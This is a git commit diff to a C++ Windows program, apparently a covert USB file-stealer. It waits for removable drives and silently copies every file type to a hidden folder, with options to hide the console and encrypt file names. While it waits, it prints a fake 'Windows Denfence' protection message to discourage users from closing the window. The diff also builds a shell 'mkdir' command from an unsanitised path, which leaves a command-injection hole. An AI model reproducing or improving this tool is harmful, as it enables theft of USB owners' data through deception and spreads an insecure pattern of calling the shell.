fc90633a262df7099f6b626dac1501409fd884ae
ZRY233 <zhangruiyang233@gmail.com>
2022-10-09 23:51:27 +0800

    有bug待修复，copyFiles函数还需要改进。 主要是cout部分，输出还是存在问题。

--- scanAndCopy/main.cpp
+++ scanAndCopy/main.cpp
@@ -16,7 +16,7 @@ const char targetExtension[][32]
 {
 	//要复制的文件的格式
 	//全部文件使用: "*.*"
-	//"*.*",
+	"*.*",
 	".exe",
 	".txt",
 	".pptx",
@@ -24,17 +24,18 @@ const char targetExtension[][32]
 	"xlsx",
 };
 
-#define RESERVE_DIRECTORY	true	// * 连同目录一起复制
-#define LOG_FILE			true	// * 日志文件
-#define LF_DESTINATION		""		// * 日志文件输出位置
-#define DELAY_TIME			3		//扫描间隔时间(单位:秒)
-#define SHOW_CONSOLE		true	//是否显示控制台
-#define SHOW_FILES			true	//是否列出文件列表在控制台
-#define OVERWRITER			true	//是否覆盖已有文件
-#define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
-#define FNE_MAP_DESTINATION	"D:/1.txt"	//键对值文件位置
-#define HIDE_FILE			false	//隐藏被复制的文件
-#define DESTINATION			"D:/TEMp"	//复制文件的目的地
+#define RESERVE_DIRECTORY	true			// * 连同目录一起复制
+#define LOG_FILE			true			// * 日志文件
+#define LF_DESTINATION		""				// * 日志文件输出位置
+#define DELAY_TIME			3				//扫描间隔时间(单位:秒)
+#define SHOW_CONSOLE		true			//是否显示控制台
+#define SHOW_FILES			true			//是否列出文件列表在控制台
+#define OVERWRITER			true			//是否覆盖已有文件
+#define FILENAME_ENCRYPT	true			// * 是否加密文件名(加密方式:键对值)
+#define FNE_MAP_DESTINATION	"D:/1.txt"		//键对值文件位置
+#define HIDE_FILE			true			//隐藏被复制的文件
+#define DESTINATION			"D:/a/b/c/d/file"	//复制文件的目的地(可设置文件名前缀)
+//路径使用"/"分割,而不是"\"
 
 ////////////////      控制台      \\\\\\\\\\\\\\\\\
 
@@ -54,6 +55,36 @@ int getRemovableDriver(char(*remDrvList)[4])
 	return count;
 }
 
+bool willUseDirectory(const char* path)
+{
+	char _path[1024]{};
+	strcpy_s(_path, 1024, path);
+	for (int i = 0; i < 1024; i++)if (_path[i] == (char)'/') _path[i] = (char)'\\';
+	if (path[strlen(_path) - 1] != (char)'\\')
+	{
+		for (int i = strlen(_path) - 1; i > 0; i--)
+		{
+			if (_path[i - 1] == (char)'\\')
+			{
+				_path[i] = (char)'\0';
+				break;
+			}
+		}
+	}
+
+	if (_access(_path, 0))
+	{
+		char command[1024] = "mkdir ";
+		strcat_s(command, 1024, _path);
+		if (system(command))
+		{
+			return false;
+		}
+		else return true;
+	}
+	else return true;
+}
+
 bool willUseFile(const char* path)
 {
 	if (_access(path, 0))
@@ -63,20 +94,6 @@ bool willUseFile(const char* path)
 			return true;
 		}
 		else return false;
-	}
-	else return true;
-}
-
-bool willUseDirectory(const char* path)
-{
-	if (_access(path, 0))
-	{
-		CreateDirectoryA(path, nullptr);
-		if (_access(path, 0))
-		{
-			return false;
-		}
-		else return true;
 	}
 	else return true;
 }
@@ -115,14 +132,28 @@ void copyFiles(const char* src)
 							}
 							else cout << "|SUCCESS| " << srcFilePath << " -> " << desFilePath << endl;
 						}
-						//要么是已经隐藏了的文件，不然就是真的复制失败了。
-						else cout << "|FAIL| " << srcFilePath << endl;
+						else
+						{
+							if (_access(desFilePath, 0))
+							{
+								cout << "|FAIL| " << srcFilePath << endl;
+							}
+							else if (GetFileAttributesA(desFilePath) & FILE_ATTRIBUTE_HIDDEN)
+							{
+								cout << "文件已存在，是隐藏文件" << endl;
+							}
+							else
+							{
+								cout << "error" << endl;
+							}
+						}
 					}
+
+					//此处存在一个bug，开启隐藏文件且复制失败会导致输出 "(HIDDEN)| "。。。。
 
 					if (HIDE_FILE)
 					{
-						DWORD oldAttribute = GetFileAttributesA(srcFilePath);
-						if (SetFileAttributesA(desFilePath, oldAttribute | FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
+						if (SetFileAttributesA(desFilePath, FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
 							cout << "(HIDDEN)| " << srcFilePath << " -> " << desFilePath << endl;
 					}
 
@@ -139,7 +170,7 @@ void fileNameEncrypt(char* fileName, ofstream* outputFile)
 	strcpy_s(oldFileName, 1024, fileName);
 
 	char optinalChar[1024]{};
-	
+
 
 
 	for (int i = 0; i < 128; i++)
@@ -178,55 +209,48 @@ int main()
 		exit(114514);
 	}
 
+	HWND hwnd = GetForegroundWindow();
+	if (SHOW_CONSOLE)
+	{
+		ShowWindow(hwnd, SW_SHOW);
+	}
+	else
+	{
+		ShowWindow(hwnd, SW_HIDE);
+	}
 
 
+again:
+
+	//while (true)
+	//{
+	char remDrvList[32][4]{};
+	int remDrvCount = 0;
 
 
+	do
+	{
+		remDrvCount = getRemovableDriver(remDrvList);
+		time_t t = time(nullptr);
+		char strTime[128]{};
+		ctime_s(strTime, 128, &t);
+		strTime[strlen(strTime) - 1] = (char)'\0';
+		//扯鬼
+		cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
+		Sleep(3 * 1000);
+	} while (remDrvCount == 0);
 
-
-
-	//	HWND hwnd = GetForegroundWindow();
-	//	if (SHOW_CONSOLE)
-	//	{
-	//		ShowWindow(hwnd, SW_SHOW);
-	//	}
-	//	else
-	//	{
-	//		ShowWindow(hwnd, SW_HIDE);
-	//	}
-	//
-	//
-	//again:
-	//
-	//	while (true)
-	//	{
-	//		char remDrvList[32][4]{};
-	//		int remDrvCount = 0;
-	//
-	//		remDrvCount = getRemovableDriver(remDrvList);
-	//
-	//		do
-	//		{
-	//			time_t t = time(nullptr);
-	//			char strTime[128]{};
-	//			ctime_s(strTime, 128, &t);
-	//			strTime[strlen(strTime) - 1] = (char)'\0';
-	//			//扯鬼
-	//			cout << "[" << strTime << "] Windows Denfence 正在保护你的电脑,请不要关闭该窗口" << endl;
-	//			Sleep(3 * 1000);
-	//		} while (remDrvCount == 0);
-	//
-	//		for (int i = 0; i < remDrvCount; i++)
-	//		{
-	//			try
-	//			{
-	//				copyFiles(remDrvList[i]);
-	//			}
-	//			catch (filesystem_error e)
-	//			{
-	//				cerr << e.what() << endl;
-	//				goto again;
-	//			}
-	//		}
-	//	}
+	for (int i = 0; i < remDrvCount; i++)
+	{
+		try
+		{
+			copyFiles(remDrvList[i]);
+		}
+		catch (filesystem_error e)
+		{
+			cerr << e.what() << endl;
+			goto again;
+		}
+	}
+	//}
 }
